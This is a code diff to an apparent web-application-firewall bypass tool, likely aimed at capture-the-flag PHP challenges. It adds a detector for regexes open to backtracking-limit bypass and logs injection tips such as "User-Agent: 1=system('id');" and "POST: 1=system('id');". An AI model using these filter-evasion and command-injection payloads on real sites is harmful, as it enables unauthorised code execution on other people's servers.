@@ -9,10 +9,11 @@ from . import bypass
 from . import bypass_data
 from . import utils
 
-version = "1.0-beta_v4"
+version = "1.0-beta_v5"
 
 SPECIAL_UPLOAD_POC_PAYLOAD = bypass_data.SPECIAL_UPLOAD_POC_TRIGGER_PAYLOADS[1]
 SPECIAL_UPLOAD_POC_EGS = bypass_data.SPECIAL_UPLOAD_POC_EGS
+BACKTRACK_LIMIT_POC_EGS = bypass_data.BACKTRACK_LIMIT_POC_EGS
 
 
 def banner(version_text):
@@ -67,6 +68,49 @@ def _emit_special_payload_egs(logger, payload):
     logger.info("Example: ")
     for line in bypass_data.SPECIAL_UPLOAD_POC_EGS.splitlines():
         logger.info(line)
+
+
+def _extract_regex_pattern(waf_regex: str):
+    if not waf_regex:
+        return ""
+    pattern = waf_regex.strip()
+    if pattern.startswith("/") and pattern.count("/") >= 2:
+        last = pattern.rfind("/")
+        return pattern[1:last]
+    return pattern
+
+
+def _looks_like_backtrack_risk_regex(waf_regex: str):
+    pattern = _extract_regex_pattern(waf_regex)
+    if not pattern:
+        return False
+
+    lowered = pattern.lower()
+    if "(?r)" in lowered or "(?0)" in lowered:
+        return True
+
+    has_anchors = "^" in pattern and "$" in pattern
+    has_greedy_prefix = ".*(" in pattern or ".+(" in pattern
+    has_repeat = "*" in pattern or "+" in pattern or "{" in pattern
+    has_wide_class = r"\w" in pattern or r"\W" in pattern
+
+    return has_anchors and has_greedy_prefix and has_repeat and has_wide_class
+
+
+def _emit_contextual_tips(logger, payload, waf_regex):
+    _emit_special_payload_egs(logger, payload)
+
+    if payload in bypass_data.HEADER_TIP_TRIGGER_PAYLOADS:
+        logger.info("TIPS: User-Agent: 1=system('id');")
+        logger.info("TIPS: User-Agent: system('id');")
+
+    if payload in bypass_data.VARIABLE_HIJACK_TIP_TRIGGER_PAYLOADS:
+        logger.info("TIPS: POST: 1=system('id');")
+
+    if _looks_like_backtrack_risk_regex(waf_regex):
+        logger.info("Example (Backtrack limit bypass):")
+        for line in BACKTRACK_LIMIT_POC_EGS.splitlines():
+            logger.info(line)
 
 
 def purewaf(
@@ -193,7 +237,7 @@ def purewaf(
     logger.info(f"[+] Shortest Flag Payload : {shortest_flag}")
     logger.info("-" * 40)
     logger.info("")
-    _emit_special_payload_egs(logger, shortest_flag)
+    _emit_contextual_tips(logger, shortest_flag, waf_regex)
     logger.info("")
 
     return shortest_flag
